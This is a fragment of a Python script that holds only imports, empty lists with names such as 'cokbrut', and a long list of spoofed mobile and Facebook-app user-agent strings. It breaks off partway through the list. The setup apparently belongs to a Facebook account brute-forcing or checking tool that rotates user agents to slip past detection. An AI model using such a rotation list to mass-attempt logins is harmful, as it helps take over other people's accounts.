from rich.table import Table as me
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from time import sleep
from concurrent.futures import ThreadPoolExecutor as tred
from datetime import datetime
from bs4 import BeautifulSoup
from bs4 import BeautifulSoup as parser
import time
import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64
from rich.table import Table as me
from rich import pretty
from rich.text import Text as tekz
pretty.install()

# UA LIST
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
pwv=[]

ugen=([
"Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z007;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]",
"Mozilla/5.0 (Linux; Android 12; PEMSES) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Mobile Safari/537.39",
"Mozilla/5.0 (Linux; arm_64; Android 12; POCO F2 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.141 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 10; M2006C3MNG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 10; M2006C3MNG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.0.0 Mobile Safari/537.36",
"Mozilla/5.0 (Linux;Tizen 2.4; SAMSUNG SM-Z200Y) AppleWebKit/537.3 (KHTML, like Gecko) SamsungBrowser/1.1 Mobile Safari/537.3",
"Mozilla/5.0 (Linux; Android 12; CPH2127) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36 QIHU 360SE/12.2.1884.0",
"Mozilla/5.0 (Linux; Android 9; GLK-LX1U Build/HUAWEIGLK-LX1U; rv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Rocket/2.1.11 Chrome/70.0.3538.64 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 5.1; E71 Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Start/53.0.2785.97 Chrome/53.0.2785.97 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 5.1; XT1077 Build/LPB23.13-79; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.134 Mobile Safari/537.36 LeBrowser/8.1.0",
"UCWEB/8.8 (X11 ;Linux ; Ubuntu; en-US) UCBrowser/8.8.1.25 NokiaE6",
"UCWEB/8.8 (Symbian/3; U; Nokia603/RM-779; Configuration/CLDC-1.1 Profile/MIDP-2.1; en-US) AppleWebKit/534.3 (KHTML like Gecko) QtWRT/1.0 Mobile Safari/534.3 U2/1.0.0 UCBrowser/8.8.0.245",
"Mozilla/5.0 (Linux; U; Android 9; zh-CN; VTR-AL00 Build/HUAWEIVTR-AL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/12.0.4.987 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; U; Android 2.3.5; en-us; Micromax A65 Build/MocorDroid2.3.5) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1 UCBrowser/2.6.0.370",
"Mozilla/5.0 (iPhone; CPU iPhone OS 14.6 (17F80) like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/100.0 Mobile/15E148 Safari/605.1.15",
"Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.26 Safari/537.36 Core/1.63.5972.400 LBBROWSER/10.1.3721.400",
"Mozilla/5.0 (Linux; Android 8.1.0; DRA-AL00 Build/HUAWEIDRA-AL00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.110 Mobile Safari/537.36 Mb2345Browser/12.5.2oem",
"Mozilla/5.0 (Linux; Android 10; GLK-AL00 Build/HUAWEIGLK-AL00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.64 Mobile Safari/537.36 Mb2345Browser/12.5.2oem",
"Mozilla/5.0 (Series40; NokiaX3-02/07.15; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/3.9.0.0.22",
"Mozilla/5.0 (Series40; NokiaX3-00/08.54; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/3.7.0.0.11",
"Mozilla/5.0 (Series40; NokiaX2-02/12.04; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/3.7.0.0.11",
"Mozilla/5.0 (Linux; BRAVIA 4K 2015 Build/LMY48E.S265) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.101 Safari/537.36 OPR/28.0.1754.0 OMI/4.4.22.20.E102586-1.136",
"Mozilla/5.0 (Linux; BRAVIA 4K 2015 Build/LMY48E.S203) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.101 Safari/537.36 OPR/28.0.1754.0 OMI/4.4.22.20.E102586-1.126",
"Mozilla/5.0 (Linux; U; Android 9; en-gb; RMX1925 Build/PKQ1.190616.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 RealmeBrowser/35.5.0.8",
"Mozilla/5.0 (Linux; U; Android 9; en-au; RMX1941 Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 RealmeBrowser/35.5.0.8",
"Mozilla/5.0 (Linux; U; Android 9; in-id; RMX1941 Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 RealmeBrowser/35.5.0.8",
"Mozilla/5.0 (Linux; U; Windows Phone; th-TH; VOG-L29 Build/HUAWEIVOG-L29) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/12.10.0.1163 UCTurbo/1.10.9.900 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; U; Android 9; en; itel W6002 Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/12.10.0.1163 UCTurbo/1.10.6.900 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 9; vivo X21UD A Build/PKQ1.180819.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36 VivoBrowser/7.8.10.4",
"Mozilla/5.0 (Linux; Android 9; vivo 1910 Build/PKQ1.190302.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/7.14.2.1",
"Mozilla/5.0 (Linux; Android 9; vivo X21i A Build/P00610; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36 VivoBrowser/7.8.10.4",
"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 YaBrowser/18.1.1.840 Yowser/2.5 Safari/537.36",
"Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413",
"NokiaE71-2;Mozilla/5.0(symbianos/9.2;u;nokiae71-2/100.07.76 profile/midp-2.0 Configuration/cldc-1.1)applewebkit/413",
"Opera/9.80 (J2ME/MIDP; Opera Mini/SymbianOS/22.478; U; en) Presto/2.5.25 Version/10.54",
"Mozilla/5.0 (S60V3; U; ar-sa; NOKIAE90) AppleWebKit/530.13 (KHTML, like Gecko) UCBrowser/8.6.0.199/28/444/UCWEB Mobile",
"Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.8.1.3) Gecko/20070310 Firefox/2.0.0.3 (Debian-2.0.0.3-1)",
"3/5.0 (Linux; Android 6.0.1; CPH1607 Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/63.0.3239.111 Mobile Safari/537.36",
"Mozilla/5.0 (PlayBook; U; RIM Tablet OS 2.1.0; en-US) AppleWebKit/536.2+ (KHTML like Gecko) Version/7.2.1.0 Safari/536.2+ Edg/93.0.4577.63",
"Mozilla/5.0 (Linux; Android 8.1.1; Redmi 11 Lite Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.565575.109 Mobile Safari/537.36",
"Mozilla/5.0 (Linux;Tizen 2.4; SAMSUNG SM-Z200Y) AppleWebKit/537.3 (KHTML, like Gecko) SamsungBrowser/1.1 Mobile Safari/537.3",
"Mozilla/5.0 (Linux; arm; Android 10; M2006C3MNG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.134 YaBrowser/22.7.2.89.00 SA/3 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; U; Android 10; ru-ru; Redmi 9C NFC Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.116 Mobile Safari/537.36 XiaoMi/MiuiBrowser/13.6.0-gn",
"Mozilla/5.0 (Linux; Android 10; M2006C3MNG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 10; M2006C3MNG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 10; M2006C3MNG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.78 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 10; M2006C3MNG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.61 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 10; M2006C3MNG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 10; M2006C3MNG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 10; M2006C3MNG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.58 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; U; Android 10; fr-fr; Redmi 9C NFC Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.116 Mobile Safari/537.36 XiaoMi/MiuiBrowser/12.24.1-gn",
"Mozilla/5.0 (Linux; Android 10; M2006C3MNG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 10; M2006C3MNG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.98 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 10; M2006C3MNG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 10; M2006C3MNG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.92 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 10; M2006C3MNG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 10; M2006C3MNG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 10; M2006C3MNG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 10; M2006C3LG Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.101 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; U; Android 11; en-us; M2006C3LG Build/JOP24G) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/68.0.3440.91 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 10; M2006C3LI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; arm; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.167 YaBrowser/22.7.7.86.00 SA/3 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36",
"Mozilla/5.0 (Linux; Android 11; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 10; M2006C3LG Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 10; M2006C3LG Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 11; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 10; M2006C3LG Build/QP1A.190711.020;) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.101 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 10; M2006C3LG Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/97.0.4692.87 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36",
"Mozilla/5.0 (Linux; Android 10; M2006C3LI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; U; Android 10; ru-ru; Redmi 9A Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.116 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 11; M2006C3LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 10; M2006C3LI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.58 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 11; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 11; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.0.0 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 9; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; U; Android 9; Redmi 6A Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/74.0.3729.136 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; U; Android 9; th-th; Redmi 6A Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.116 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 8.1.0; Redmi 6A Build/O11019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 9; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 9; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; U; Android 9; en-US; Redmi 6A Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 UCBrowser/13.4.0.1306 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 8.1.0; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 8.1.0; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.58 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 9; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 8.1.0; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 9; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.99 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 8.1.0; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 8.1.0; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 9; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.61 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 8.1.0; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.61 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; arm; Android 9; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.141 YaApp_Android/22.35.1 YaSearchBrowser/22.35.1 BroPP/1.0 SA/3 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 9; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 9; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 9; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Mobile Safari/537.36",
"Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 241.1.0.17.112 (iPhone9,4; iOS 15_5; it_IT; it-IT; scale=2.61; 1080x1920; 379986242) NW/3",
"TuneIn Radio/23.5.0; iPhone12,5; iOS/15.5",
"Mozilla/5.0 (Linux; Android 7.0; QPHONE_9.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 10; S58Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 10; ELE-L29 Build/HUAWEIELE-L29; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/102.0.5005.125 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/368.0.0.24.108;]",
"Mozilla/5.0 (Linux; Android 8.1.0; W_P200) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 11; Redmi Note 8T Build/RKQ1.201004.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.70 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/372.1.0.23.107;]",
"Mozilla/5.0 (Linux; Android 10; SM-G965F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/99.0.4844.88 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/372.1.0.23.107;]",
"Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Mobile/15E148 Safari/604.1 [ip:37.163.42.5]",
"Mozilla/5.0 (Linux; Android 9; VFD 730) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36",
"Dalvik/2.1.0 (Linux; U; Android 9; POT-LX3 Build/HUAWEIPOT-L23)",
"Mozilla/5.0 (Linux; Android 11; M2003J15SC Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/102.0.5005.125 Mobile Safari/537.36 Instagram 240.2.0.18.107 Android (30/11; 440dpi; 1080x2110; Xiaomi/Redmi; M2003J15SC; merlinnfc; mt6768; it_IT; 378116740)",
"Mozilla/5.0 (Linux; Android 11; CPH2065 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/102.0.5005.125 Mobile Safari/537.36 Instagram 240.2.0.18.107 Android (30/11; 480dpi; 1080x2156; OPPO; CPH2065; OP4BDCL1; mt6873; it_IT; 378116740)",
"Mozilla/5.0 (Linux; Android 9; AMN-LX9 Build/HUAWEIAMN-LX9; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.70 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/372.1.0.23.107;]",
"Mozilla/5.0 (Linux; Android 9; ANE-LX1 Build/HUAWEIANE-L21; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/79.0.3945.116 Mobile Safari/537.36 Instagram 230.0.0.20.108 Android (28/9; 480dpi; 1080x2190; HUAWEI; ANE-LX1; HWANE; hi6250; it_IT; 363352028)",
"Mozilla/5.0 (iPhone; CPU iPhone OS 15_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 240.1.0.26.107 (iPhone11,8; iOS 15_4_1; it_IT; it-IT; scale=2.00; 828x1792; 378200232) NW/1",
"Mozilla/5.0 (Linux; Android 9; SM-A202F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.181 Mobile Safari/537.36 (Ecosia android@88.0.4324.181) [ip:158.148.61.78]",
"Mozilla/5.0 (Linux; Android 11; SM-A505FN Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.70 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/373.0.0.31.112;]",
"Mozilla/5.0 (iPhone; CPU iPhone OS 15_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 240.1.0.26.107 (iPhone11,8; iOS 15_4_1; it_IT; it-IT; scale=2.00; 828x1792; 378200232)",
"Mozilla/5.0 (Linux; Android 10; Nokia 7 plus) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Mobile Safari/537.36 (Ecosia android@101.0.4951.41) [ip:185.212.69.206]",
"Mozilla/5.0 (Android 10; Mobile; rv:100.0) Gecko/100.0 Firefox/100.0 QwantMobile/4.2 [ip:5.102.4.47]",
"Mozilla/5.0 (Linux; Android 7.1.1; Moto G (5S)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.70 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 6.0.1; ASUS_X00AD) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 12; SM-G998B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/102.0.5005.125 Mobile Safari/537.36 Instagram 240.2.0.18.107 Android (31/12; 560dpi; 1440x2932; samsung; SM-G998B; p3s; exynos2100; it_IT; 378116730)",
"Mozilla/5.0 (Linux; Android 11; SM-A217F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Mobile Safari/537.36 [ip:5.90.111.17]",
"Mozilla/5.0 (Linux; Android 12; SM-G996B Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.70 Mobile Safari/537.36 OPT/2.9",
"Mozilla/5.0 (Linux; Android 10; LYA-L29 Build/HUAWEILYA-L29; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.53 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/372.1.0.23.107;]",
"Mozilla/5.0 (Linux; Android 9; SM-A202F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.181 Mobile Safari/537.36 (Ecosia android@88.0.4324.181) [ip:158.148.48.68]",
"Mozilla/5.0 (Linux; Android 11; M2004J19C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Mobile Safari/537.36 [ip:151.57.169.8]",
"Mozilla/5.0 (Linux; Android 8.1.0; meizu M8 Build/O11019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.70 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/372.1.0.23.107;]",
"Mozilla/5.0 (Linux; Android 10; MAR-LX3A Build/HUAWEIMAR-L03A; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/102.0.5005.125 Mobile Safari/537.36 UCURSOS/v1.6_273-android",
"Mozilla/5.0 (Linux; Android 11; T766H_EEA) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36 [ip:49.236.50.227]",
"Mozilla/5.0 (Linux; Android 6.0.1; SM-A800I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.0.0 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 7.1.2; Redmi 5 Build/N2G47H; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/84.0.4147.105 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/370.0.0.23.112;]",
"Mozilla/5.0 (Linux; Android 11; SM-M127F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Mobile Safari/537.36 [ip:5.77.88.228]",
"Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 239.2.0.17.109 (iPhone10,5; iOS 15_5; it_IT; it-IT; scale=2.88; 1080x1920; 376668393)",
"Mozilla/5.0 (Linux; Android 10; Redmi Note 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.70 Mobile Safari/537.36",
"Dalvik/2.1.0 (Linux; U; Android 11; Nokia C21 Plus Build/RP1A.201005.001)",
"stagefright/1.2 (Linux;Android 4.4.4 Huawei T1-A21L T1-A21LV100R001C178B005)",
"Mozilla/5.0 (iPhone; CPU iPhone OS 15_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/604.1 [ip:193.207.202.255]",
"Mozilla/5.0 (Linux; Android 11; 21061119DG Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/102.0.5005.125 Mobile Safari/537.36 Instagram 240.2.0.18.107 Android (30/11; 440dpi; 1080x2167; Xiaomi/Redmi; 21061119DG; eos; mt6768; it_IT; 378116740)",
"Dalvik/2.1.0 (Linux; U; Android 10.0; Z40 Build/LMY47I)",
"Mozilla/5.0 (Linux; Android 7.1.1; SAMSUNG SM-J510FN) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/15.0 Chrome/90.0.4430.210 Mobile Safari/537.36 [ip:151.18.115.134]",
"Mozilla/5.0 (Linux; Android 11; SM-A505FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Mobile Safari/537.36 [ip:37.162.167.136]",
"Mozilla/5.0 (iPhone; CPU iPhone OS 15_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/604.1 [ip:193.207.219.189]",
"Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Mobile/15E148 Safari/604.1 [ip:37.163.34.229]",
"Mozilla/5.0 (Linux; Android 10; F2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36 [ip:5.171.215.142]",
"TuneIn Radio/23.5.0; iPhone8,4; iOS/15.3.1",
"Mozilla/5.0 (Linux; Android 11; M2003J15SC Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.70 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/372.1.0.23.107;]",
"Mozilla/5.0 (Linux; Android 10; SNE-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36 [ip:188.153.103.130]",
